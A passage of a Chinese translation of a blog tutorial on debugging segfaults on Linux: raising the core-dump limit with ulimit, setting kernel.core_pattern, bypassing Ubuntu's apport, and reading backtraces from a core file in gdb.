class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ cat /proc/6309/limits \r\nLimit                     Soft Limit           Hard Limit           Units     \r\nMax cpu time              unlimited            unlimited            seconds   \r\nMax file size             unlimited            unlimited            bytes     \r\nMax data size             unlimited            unlimited            bytes     \r\nMax stack size            8388608              unlimited            bytes     \r\nMax core file size        0                    unlimited            bytes     \r\nMax resident set          unlimited            unlimited            bytes     \r\nMax processes             30571                30571                processes \r\nMax open files            1024                 1048576              files     \r\nMax locked memory         65536                65536                bytes     \r\nMax address space         unlimited            unlimited            bytes     \r\nMax file locks            unlimited            unlimited            locks     \r\nMax pending signals       30571                30571                signals   \r\nMax msgqueue size         819200               819200               bytes     \r\nMax nice priority         0                    0                    \r\nMax realtime priority     0                    0                    \r\nMax realtime timeout      unlimited            unlimited            us   \r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a27310cf131217178-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a27310cf131217178-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a27310cf131217178-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a27310cf131217178-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a27310cf131217178-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a27310cf131217178-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a27310cf131217178-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a27310cf131217178-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a27310cf131217178-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a27310cf131217178-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a27310cf131217178-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a27310cf131217178-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a27310cf131217178-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a27310cf131217178-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a27310cf131217178-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a27310cf131217178-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a27310cf131217178-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a27310cf131217178-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a27310cf131217178-19\">19</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a27310cf131217178-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">cat</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">proc</span><span class=\"crayon-o\">/</span><span class=\"crayon-cn\">6309</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">limits </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a27310cf131217178-2\"><span class=\"crayon-e\">Limit                     </span><span class=\"crayon-e\">Soft </span><span class=\"crayon-e\">Limit           </span><span class=\"crayon-e\">Hard </span><span class=\"crayon-e\">Limit           </span><span class=\"crayon-e\">Units     </span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a27310cf131217178-3\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">cpu </span><span class=\"crayon-e\">time              </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">seconds   </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a27310cf131217178-4\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">file </span><span class=\"crayon-e\">size             </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a27310cf131217178-5\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">data </span><span class=\"crayon-e\">size             </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a27310cf131217178-6\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">stack </span><span class=\"crayon-i\">size</span><span class=\"crayon-h\">            </span><span class=\"crayon-cn\">8388608</span><span class=\"crayon-h\">              </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a27310cf131217178-7\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">core </span><span class=\"crayon-e\">file </span><span class=\"crayon-i\">size</span><span class=\"crayon-h\">        </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                    </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a27310cf131217178-8\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">resident </span><span class=\"crayon-e\">set          </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a27310cf131217178-9\"><span class=\"crayon-e\">Max </span><span class=\"crayon-i\">processes</span><span class=\"crayon-h\">             </span><span class=\"crayon-cn\">30571</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">30571</span><span class=\"crayon-h\">                </span><span class=\"crayon-e\">processes </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a27310cf131217178-10\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">open </span><span class=\"crayon-i\">files</span><span class=\"crayon-h\">            </span><span class=\"crayon-cn\">1024</span><span class=\"crayon-h\">                 </span><span class=\"crayon-cn\">1048576</span><span class=\"crayon-h\">              </span><span class=\"crayon-e\">files     </span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a27310cf131217178-11\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">locked </span><span class=\"crayon-i\">memory</span><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">65536</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">65536</span><span class=\"crayon-h\">                </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a27310cf131217178-12\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">address </span><span class=\"crayon-e\">space         </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a27310cf131217178-13\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">file </span><span class=\"crayon-e\">locks            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">locks     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a27310cf131217178-14\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">pending </span><span class=\"crayon-i\">signals</span><span class=\"crayon-h\">       </span><span class=\"crayon-cn\">30571</span><span class=\"crayon-h\">                </span><span class=\"crayon-cn\">30571</span><span class=\"crayon-h\">                </span><span class=\"crayon-e\">signals   </span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a27310cf131217178-15\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">msgqueue </span><span class=\"crayon-i\">size</span><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">819200</span><span class=\"crayon-h\">               </span><span class=\"crayon-cn\">819200</span><span class=\"crayon-h\">               </span><span class=\"crayon-e\">bytes     </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a27310cf131217178-16\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">nice </span><span class=\"crayon-i\">priority</span><span class=\"crayon-h\">         </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                    </span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a27310cf131217178-17\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">realtime </span><span class=\"crayon-i\">priority</span><span class=\"crayon-h\">     </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                    </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\">                    </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a27310cf131217178-18\"><span class=\"crayon-e\">Max </span><span class=\"crayon-e\">realtime </span><span class=\"crayon-e\">timeout      </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-e\">unlimited            </span><span class=\"crayon-i\">us</span><span class=\"crayon-h\">   </span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a27310cf131217178-19\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0104 seconds] -->\r\n<p>内核在决定写入多大的核心转储文件时使用软限制soft limit（在这种情况下，<code>max core file size = 0</code>）。 您可以使用 shell 内置命令 <code>ulimit</code>（<code>ulimit -c unlimited</code>） 将软限制增加到硬限制hard limit。</p>\n<h3 id=\"toc_5\">kernel.core_pattern：核心转储保存在哪里</h3>\n<p><code>kernel.core_pattern</code> 是一个内核参数，或者叫 “sysctl 设置”，它控制 Linux 内核将核心转储文件写到磁盘的哪里。</p>\n<p>内核参数是一种设定您的系统全局设置的方法。您可以通过运行 <code>sysctl -a</code> 得到一个包含每个内核参数的列表，或使用 <code>sysctl kernel.core_pattern</code> 来专门查看 <code>kernel.core_pattern</code> 设置。</p>\n<p>所以 <code>sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t</code> 将核心转储保存到目录 <code>/tmp</code> 下，并以 <code>core</code> 加上一系列能够标识（出故障的）进程的参数构成的后缀为文件名。</p>\n<p>如果你想知道这些形如 <code>%e</code>、<code>%p</code> 的参数都表示什么，请参考 <a href=\"http://man7.org/linux/man-pages/man5/core.5.html\">man core</a>。</p>\n<p>有一点很重要，<code>kernel.core_pattern</code> 是一个全局设置 —— 修改它的时候最好小心一点，因为有可能其它系统功能依赖于把它被设置为一个特定的方式（才能正常工作）。</p>\n<h3 id=\"toc_6\">kernel.core_pattern 和 Ubuntu</h3>\n<p>默认情况下在 ubuntu 系统中，<code>kernel.core_pattern</code> 被设置为下面的值：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a27310d5206074683\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ sysctl kernel.core_pattern\r\nkernel.core_pattern = |/usr/share/apport/apport %p %s %c %d %P\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a27310d5206074683-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a27310d5206074683-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a27310d5206074683-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a27310d5206074683-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">sysctl </span><span class=\"crayon-v\">kernel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">core_pattern</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a27310d5206074683-2\"><span class=\"crayon-v\">kernel</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">core_pattern</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">|</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">usr</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">share</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">apport</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">apport</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">p</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">s</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-v\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">%</span><span class=\"crayon-i\">P</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a27310d5206074683-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>这引起了我的迷惑（这 apport 是干什么的，它对我的核心转储做了什么？）。以下关于这个我了解到的：</p>\n<ul>\n<li>Ubuntu 使用一种叫做 apport 的系统来报告 apt 包有关的崩溃信息。</li>\n<li>设定 <code>kernel.core_pattern=|/usr/share/apport/apport %p %s %c %d %P</code> 意味着核心转储将被通过管道送给 <code>apport</code> 程序。</li>\n<li>apport 的日志保存在文件 <code>/var/log/apport.log</code> 中。</li>\n<li>apport 默认会忽略来自不属于 Ubuntu 软件包一部分的二进制文件的崩溃信息</li>\n</ul>\n<p>我最终只是跳过了 apport，并把 <code>kernel.core_pattern</code> 重新设置为 <code>sysctl -w kernel.core_pattern=/tmp/core-%e.%p.%h.%t</code>，因为我在一台开发机上，我不在乎 apport 是否工作，我也不想尝试让 apport 把我的核心转储留在磁盘上。</p>\n<h3 id=\"toc_7\">现在你有了核心转储，接下来干什么？</h3>\n<p>好的，现在我们了解了 <code>ulimit</code> 和 <code>kernel.core_pattern</code> ，并且实际上在磁盘的 <code>/tmp</code> 目录中有了一个核心转储文件。太好了！接下来干什么？我们仍然不知道该程序为什么会出现段错误！</p>\n<p>下一步将使用 <code>gdb</code> 打开核心转储文件并获取堆栈调用序列。</p>\n<h3 id=\"toc_8\">从 gdb 中得到堆栈调用序列</h3>\n<p>你可以像这样用 <code>gdb</code> 打开一个核心转储文件：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a27310da762548952\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n$ gdb -c my_core_file\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a27310da762548952-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a27310da762548952-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a27310da762548952-1\"><span class=\"crayon-sy\">$</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">gdb</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">c</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">my_core</span><span class=\"crayon-sy\">_</span>file</div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a27310da762548952-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>接下来，我们想知道程序崩溃时的堆栈是什么样的。在 <code>gdb</code> 提示符下运行 <code>bt</code> 会给你一个调用序列backtrace。在我的例子里，<code>gdb</code> 没有为二进制文件加载符号信息，所以这些函数名就像 “??????”。幸运的是，（我们通过）加载符号修复了它。</p>\n<p>下面是如何加载调试符号。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a27310de750911259\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsymbol-file /path/to/my/binary\r\nsharedlibrary\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a27310de750911259-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a27310de750911259-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4d7a27310de750911259-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a27310de750911259-1\"><span class=\"crayon-v\">symbol</span><span class=\"crayon-o\">-</span><span class=\"crayon-v\">file</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">path</span><span class=\"crayon-o\">/</span><span class=\"crayon-st\">to</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">my</span><span class=\"crayon-o\">/</span><span class=\"crayon-e\">binary</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a27310de750911259-2\"><span class=\"crayon-i\">sharedlibrary</span></div><div class=\"crayon-line\" id=\"crayon-5b4d7a27310de750911259-3\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>这从二进制文件及其引用的任何共享库中加载符号。一旦我这样做了，当我执行 <code>bt</code> 时，gdb 给了我一个带有行号的漂亮的堆栈跟踪！</p>\n<p>如果你想它能工作，二进制文件应该以带有调试符号信息的方式被编译。在试图找出程序崩溃的原因时，堆栈跟踪中的行号非常有帮助。:)</p>\n<h3 id=\"toc_9\">查看每个线程的堆栈</h3>\n<p>通过以下方式在 <code>gdb</code> 中获取每个线程的调用栈！</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4d7a27310e1051112641\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nthread apply all bt full\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4d7a27310e1051112641-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4d7a27310e1051112641-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4d7a27310e1051112641-1\"><span class=\"crayon-e\">thread </span><span class=\"crayon-e\">apply </span><span class=\"crayon-e\">all </span><span class=\"crayon-e\">bt </span><span class=\"crayon-i\">full</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4d7a27310e1051112641-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3 id=\"toc_10\">gdb + 核心转储 = 惊喜</h3>\n<p>如果你有一个带调试符号的核心转储以及 <code>gdb</code>，那太棒了！您可以上下查看调用堆栈（LCTT 译注：指跳进调用序列不同的函数中以便于查看局部变量），打印变量，并查看内存来得知发生了什么。这是最好的。</p>\n<p>如果您仍然正在基于 gdb 向导来工作上，只打印出栈跟踪与bt也可以。 :)</p>\n<h3 id=\"toc_11\">ASAN</h3>\n<p>另一种搞清楚您的段错误的方法是使用 AddressSanitizer 选项编译程序（“ASAN”，即 <code>$CC -fsanitize=address</code>）然后运行它。 本文中我不准备讨论那个，因为本文已经相当长了，并且在我的例子中打开 ASAN 后段错误消失了，可能是因为 ASAN 使用了一个不同的内存分配器（系统内存分配器，而不是 tcmalloc）。</p>\n<p>在未来如果我能让 ASAN 工作，我可能会多写点有关它的东西。（LCTT 译注：这里指使用 ASAN 也能复现段错误）</p>\n<h3 id=\"toc_12\">从一个核心转储得到一个堆栈跟踪真的很亲切！</h3>\n<p>这个博客听起来很多，当我做这些的时候很困惑，但说真的，从一个段错误的程序中获得一个堆栈调用序列不需要那么多步骤：</p>\n<ol>\n<li>试试用 